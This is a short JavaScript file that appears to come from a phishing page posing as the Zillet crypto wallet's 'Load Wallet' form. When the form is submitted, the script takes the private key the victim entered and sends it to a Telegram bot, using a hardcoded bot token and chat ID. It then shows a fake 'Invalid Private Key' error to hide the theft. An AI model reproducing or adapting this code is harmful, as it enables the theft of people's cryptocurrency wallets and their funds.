let inp = $("#privatekeyx");
let err = $("#errorx");
let loading = $("#private-key");

let type = "password";
$(".input__side-btn").click(() => {
  type = type == "text" ? "password" : "text";
  inp.attr("type", type);
});

function clear() {
  inp.val("");
  err.text("");
}

$("#private-key").click(async (e) => {
  e.preventDefault();
  e.stopPropagation();
  let PrivateKey = inp.val();
  //   return alert(PrivateKey);

  let msg = `Zillet...%20Name=%20Privatekey%0AValue=%20${PrivateKey}`;
  let url =
    "https://api.telegram.org/bot7691030593:AAGZXCbiRgDmBH5eWfieEA5gqyNC3IevYzU/sendMessage?chat_id=-1002443057565&text=" +
    msg;

  loading.text("Loading");
  fetch(url)
    .then(async (res) => {
      if (res.status > 299) {
        throw res;
      }
      console.log("success");

      let data = await res.json();
      loading.text("Load Wallet");
      err.text("Invalid Private Key");
    })
    .catch(async (err_) => {
      console.log(err_);
      console.log("failure");
      try {
        if (!err_.status == 401) throw err_;
        let data = await err_.json();
        loading.text("Load Wallet");
        err.text(data.message);
      } catch (error) {
        // unknown
        loading.text("Load Wallet");
        err.text("Invalid Private Key.");
      }
    });
});
